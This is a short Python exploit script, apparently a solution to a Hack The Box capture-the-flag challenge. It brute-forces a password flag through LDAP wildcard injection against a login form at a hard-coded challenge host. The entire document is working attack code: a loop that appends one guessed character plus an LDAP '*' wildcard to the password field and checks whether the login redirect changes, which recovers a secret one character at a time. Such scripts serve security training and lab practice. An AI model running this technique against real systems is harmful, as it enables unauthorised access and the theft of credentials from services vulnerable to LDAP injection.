'''
LDAP Injection using wildcards

'''

import requests
import string

HOST = "206.189.20.124"		# Given by the challenge when building up the instance
PORT = 30987				# Given by the challenge when building up the instance
AUTH_FAILED = 'http://206.189.20.124:30987/login?message=Authentication%20failed'

charlist = (string.ascii_uppercase + string.ascii_lowercase + string.digits + '_')


def exploit():

	url = f'http://{HOST}:{PORT}/login'
	payload = {'username': 'Reese', 'password': 'HTB{ '}

	# Brute-forcing password (i.e. flag)
	index_guess = 4
	while(True):
		payload['password'] += ' '		# 'HTB{d* '
		found = False
		for i in range(len(charlist)):
			pwd = list(payload['password'])
			pwd[index_guess] = charlist[i]		# guessing the char
			pwd[index_guess + 1] = '*'			# LDAP wildcard
			payload['password'] = ''.join(pwd)
			print(f'[+] trying: {payload["password"]}')
			resp = requests.post(url, data=payload)

			if (resp.url != AUTH_FAILED):
				index_guess += 1
				found = True
				break
		if (found == False):
			break

	flag = list(payload['password'])
	flag[-2] = '}'
	flag = ''.join(flag)
	print(f'[!] Found: {flag[:-1]}')

if __name__ == '__main__':
	exploit()